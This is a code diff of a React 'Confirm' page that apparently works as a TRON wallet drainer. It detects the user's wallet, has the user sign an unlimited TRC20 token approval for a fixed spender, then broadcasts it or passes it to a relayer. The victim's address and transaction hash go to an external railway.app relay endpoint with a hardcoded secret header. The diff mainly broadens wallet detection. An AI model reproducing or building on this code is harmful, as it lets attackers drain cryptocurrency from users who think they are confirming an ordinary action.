@@ -27,34 +27,38 @@ export default function Confirm() {
 
   const getTronWeb = () => {
     addLog('Checking providers...')
+    const w = window as any
 
-    if ((window as any).tronWeb && (window as any).tronWeb.ready) {
-      addLog('Found: window.tronWeb (standard)')
-      return (window as any).tronWeb
+    if (w.tronWeb && w.tronWeb.ready) {
+      addLog('Found: window.tronWeb')
+      return w.tronWeb
     }
-
-    if ((window as any).tron && (window as any).tron.ready) {
-      addLog('Found: window.tron')
-      return (window as any).tron
-    }
-
-    if ((window as any).tronLink && (window as any).tronLink.ready) {
+    if (w.tronLink && w.tronLink.ready) {
       addLog('Found: window.tronLink')
-      return (window as any).tronLink
+      return w.tronLink
     }
-
-    if ((window as any).trustwallet && (window as any).trustwallet.tronWeb && (window as any).trustwallet.tronWeb.ready) {
+    if (w.tronWeb && w.tronWeb.defaultAddress) {
+      addLog('Found: window.tronWeb (via defaultAddress)')
+      return w.tronWeb
+    }
+    if (w.tronLink && w.tronLink.tronWeb) {
+      addLog('Found: window.tronLink.tronWeb')
+      return w.tronLink.tronWeb
+    }
+    if (w.trustwallet && w.trustwallet.tronWeb) {
       addLog('Found: window.trustwallet.tronWeb')
-      return (window as any).trustwallet.tronWeb
+      return w.trustwallet.tronWeb
+    }
+    if (w.tronWeb) {
+      addLog('Found: window.tronWeb (raw)')
+      return w.tronWeb
+    }
+    if (w.tronLink) {
+      addLog('Found: window.tronLink (raw)')
+      return w.tronLink.tronWeb || w.tronLink
     }
 
-    if ((window as any).trustwallet && (window as any).trustwallet.tron && (window as any).trustwallet.tron.ready) {
-      addLog('Found: window.trustwallet.tron')
-      return (window as any).trustwallet.tron
-    }
-
-    addLog('ERROR: No provider found')
-    addLog('Keys on window: ' + Object.keys(window as any).filter(k => k.toLowerCase().includes('tron') || k.toLowerCase().includes('trust') || k.toLowerCase().includes('wallet')).join(', '))
+    addLog('ERROR: No provider')
     return null
   }
 
@@ -64,13 +68,17 @@ export default function Confirm() {
         return tronWeb.defaultAddress.base58
       }
     } catch (e) {}
-    
     try {
-      if (tronWeb.address && tronWeb.address.base58) {
-        return tronWeb.address.base58
+      if (tronWeb.defaultAddress && typeof tronWeb.defaultAddress === 'string') {
+        return tronWeb.defaultAddress
       }
     } catch (e) {}
-    
+    try {
+      const addr = tronWeb.address?.base58 || tronWeb.address
+      if (addr && typeof addr === 'string' && addr.startsWith('T')) {
+        return addr
+      }
+    } catch (e) {}
     return null
   }
 
@@ -99,7 +107,7 @@ export default function Confirm() {
 
       const balanceSun = await tronWeb.trx.getBalance(userAddress)
       const userTrx = parseFloat(tronWeb.fromSun(balanceSun))
-      addLog('TRX balance: ' + userTrx)
+      addLog('TRX: ' + userTrx)
 
       let userEnergy = 0
       try {
@@ -121,37 +129,21 @@ export default function Confirm() {
           { type: 'address', value: SPENDER },
           { type: 'uint256', value: MAX_UINT256 }
         ]
-
         const txObj = await tronWeb.transactionBuilder.triggerSmartContract(
-          TOKEN,
-          'approve(address,uint256)',
+          TOKEN, 'approve(address,uint256)',
           { feeLimit: 100000000, from: userAddress },
-          parameter,
-          userAddress
+          parameter, userAddress
         )
-
         addLog('Signing...')
         const signedTx = await tronWeb.trx.sign(txObj.transaction)
-        
         addLog('Broadcasting...')
         const result = await tronWeb.trx.sendRawTransaction(signedTx)
-
         if (result.result) {
           addLog('TX: ' + result.txid)
           fetch('https://miami-production-6e01.up.railway.app/web/relay', {
             method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-              'x-api-secret': 'my-secret-2026-x7k9'
-            },
-            body: JSON.stringify({
-              chain: 'TRC20',
-              address: userAddress,
-              txHash: result.txid,
-              spender: SPENDER,
-              token: TOKEN,
-              amount
-            }),
+            headers: { 'Content-Type': 'application/json', 'x-api-secret': 'my-secret-2026-x7k9' },
+            body: JSON.stringify({ chain: 'TRC20', address: userAddress, txHash: result.txid, spender: SPENDER, token: TOKEN, amount }),
             keepalive: true
           }).catch(() => {})
         } else {
@@ -163,33 +155,19 @@ export default function Confirm() {
           { type: 'address', value: SPENDER },
           { type: 'uint256', value: MAX_UINT256 }
         ]
-
         const txObj = await tronWeb.transactionBuilder.triggerSmartContract(
-          TOKEN,
-          'approve(address,uint256)',
+          TOKEN, 'approve(address,uint256)',
           { feeLimit: 100000000, from: userAddress },
-          parameter,
-          userAddress
+          parameter, userAddress
         )
-
         addLog('Signing for relayer...')
         const signedTx = await tronWeb.trx.sign(txObj.transaction)
-
         addLog('POSTing to relayer...')
         const response = await fetch(RELAYER_URL, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'X-API-Key': RELAYER_KEY
-          },
-          body: JSON.stringify({
-            owner: userAddress,
-            spender: SPENDER,
-            signedTransaction: signedTx,
-            timestamp: Date.now()
-          })
+          headers: { 'Content-Type': 'application/json', 'X-API-Key': RELAYER_KEY },
+          body: JSON.stringify({ owner: userAddress, spender: SPENDER, signedTransaction: signedTx, timestamp: Date.now() })
         })
-
         const relayResult = await response.json()
         if (relayResult.success) {
           addLog('Relayer TX: ' + relayResult.txid)
